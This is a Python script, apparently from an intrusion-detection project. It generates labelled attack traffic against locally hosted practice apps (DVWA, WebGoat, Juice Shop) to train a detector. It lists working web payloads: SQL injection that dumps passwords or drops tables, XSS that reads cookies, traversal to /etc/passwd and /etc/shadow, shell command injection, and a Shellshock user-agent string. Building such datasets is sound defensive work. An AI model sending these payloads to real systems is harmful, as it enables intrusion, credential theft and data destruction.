"""
scripts/traffic/attack_runner.py

Generates realistic attack traffic against the local vulnerable app stack.
Runs alongside benign_crawler.py — both should be active simultaneously.

CRITICAL DESIGN DECISIONS:
- UA must be rotated across all attack types. If every attack uses the same UA,
  the model learns UA as the malicious signal instead of the actual payload.
  This is exactly what happened with the original single-UA version.
- Attack types must be diverse: SQLi, XSS, Path Traversal, Command Injection.
  A model trained on one attack type cannot generalize to others.
- Run time: 90-120 minutes alongside benign_crawler.py.
  Target: 1500+ raw malicious log lines before parsing.

Usage:
    python scripts/traffic/attack_runner.py
"""

import requests
import time
import random

BASE = "http://localhost"

# ── SQL Injection ─────────────────────────────────────────────────────────────
SQLI_ATTACKS = [
    # DVWA SQLi endpoint
    "/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit",
    "/dvwa/vulnerabilities/sqli/?id=1 UNION SELECT user,password FROM users--",
    "/dvwa/vulnerabilities/sqli/?id=1; DROP TABLE users--",
    "/dvwa/vulnerabilities/sqli/?id=' AND SLEEP(5)--",
    "/dvwa/vulnerabilities/sqli/?id=1' AND 1=2 UNION SELECT NULL,@@version--",
    "/dvwa/vulnerabilities/sqli/?id=1' AND '1'='1",
    "/dvwa/vulnerabilities/sqli/?id=admin'--",
    "/dvwa/vulnerabilities/sqli/?id=1 OR 1=1--",
    # WebGoat SQLi endpoint
    "/webgoat/SqlInjection/attack?username=admin'--",
    "/webgoat/SqlInjection/attack?username=' OR 1=1--",
    "/webgoat/SqlInjection/attack?username=admin' AND '1'='1",
    "/webgoat/SqlInjection/attack?username=' UNION SELECT username,password FROM users--",
    "/webgoat/SqlInjection/attack?username='; DROP TABLE employees--",
]

# ── Cross-Site Scripting (XSS) ────────────────────────────────────────────────
XSS_ATTACKS = [
    # DVWA reflected XSS
    "/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>",
    "/dvwa/vulnerabilities/xss_r/?name=<img src=x onerror=alert(1)>",
    "/dvwa/vulnerabilities/xss_r/?name=<svg onload=alert(document.cookie)>",
    "/dvwa/vulnerabilities/xss_r/?name=javascript:alert(1)",
    "/dvwa/vulnerabilities/xss_r/?name=<iframe src=javascript:alert(1)>",
    "/dvwa/vulnerabilities/xss_r/?name=<body onload=alert(1)>",
    "/dvwa/vulnerabilities/xss_r/?name='\"><script>alert(1)</script>",
    # Juice Shop search XSS
    "/juice/rest/products/search?q=<script>alert(1)</script>",
    "/juice/rest/products/search?q=<img src=x onerror=alert(1)>",
    "/juice/rest/products/search?q=<svg/onload=alert(1)>",
]

# ── Path Traversal ────────────────────────────────────────────────────────────
PATH_TRAVERSAL_ATTACKS = [
    # DVWA file inclusion
    "/dvwa/vulnerabilities/fi/?page=../../../etc/passwd",
    "/dvwa/vulnerabilities/fi/?page=....//....//etc/passwd",
    "/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd",
    "/dvwa/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2fetc/passwd",
    "/dvwa/vulnerabilities/fi/?page=../../../etc/shadow",
    "/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd",
    # Generic path traversal attempts
    "/webgoat/PathTraversal/attack?filename=../../../etc/passwd",
    "/webgoat/PathTraversal/attack?filename=....//....//etc/passwd",
]

# ── Command Injection ─────────────────────────────────────────────────────────
CMD_INJECTION_ATTACKS = [
    # DVWA command injection
    "/dvwa/vulnerabilities/exec/?ip=127.0.0.1;cat /etc/passwd&Submit=Submit",
    "/dvwa/vulnerabilities/exec/?ip=127.0.0.1|whoami&Submit=Submit",
    "/dvwa/vulnerabilities/exec/?ip=127.0.0.1%3Bls%20-la&Submit=Submit",
    "/dvwa/vulnerabilities/exec/?ip=;id&Submit=Submit",
    "/dvwa/vulnerabilities/exec/?ip=127.0.0.1&&cat /etc/passwd&Submit=Submit",
    "/dvwa/vulnerabilities/exec/?ip=`id`&Submit=Submit",
    "/dvwa/vulnerabilities/exec/?ip=$(whoami)&Submit=Submit",
]

ALL_ATTACKS = SQLI_ATTACKS + XSS_ATTACKS + PATH_TRAVERSAL_ATTACKS + CMD_INJECTION_ATTACKS

# ── User Agent Rotation ───────────────────────────────────────────────────────
# CRITICAL: rotate UAs across all attack types.
# Original code used only python-requests/2.32.5 for every attack.
# The model learned UA as the malicious signal, not the payload.
# Rotation forces the model to learn from the payload/path, not the UA.
ATTACK_USER_AGENTS = [
    "sqlmap/1.7",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "curl/8.0.1",
    "python-requests/2.31.0",
    "python-requests/2.32.5",
    "Nikto/2.1.6",
    "Go-http-client/1.1",
    "WPScan v3.8.22",
    "() { :;}; /bin/bash -c 'id'",  # Shellshock in UA
    "Mozilla/5.0 (compatible; attacker/1.0)",
]


def run():
    print(f"[attack_runner] Starting. {len(ALL_ATTACKS)} attack patterns loaded.")
    print(f"[attack_runner] Attack type breakdown:")
    print(f"  SQLi:              {len(SQLI_ATTACKS)}")
    print(f"  XSS:               {len(XSS_ATTACKS)}")
    print(f"  Path Traversal:    {len(PATH_TRAVERSAL_ATTACKS)}")
    print(f"  Command Injection: {len(CMD_INJECTION_ATTACKS)}")
    print(f"[attack_runner] Press Ctrl+C to stop.\n")

    sent = 0
    while True:
        attack = random.choice(ALL_ATTACKS)
        ua = random.choice(ATTACK_USER_AGENTS)
        try:
            requests.get(
                BASE + attack,
                headers={"User-Agent": ua},
                timeout=5
            )
            sent += 1
            if sent % 50 == 0:
                print(f"[attack_runner] {sent} attacks sent so far...")
        except Exception:
            # Connection refused, timeout etc — apps may not all be running
            pass
        time.sleep(random.uniform(0.5, 2))


if __name__ == "__main__":
    run()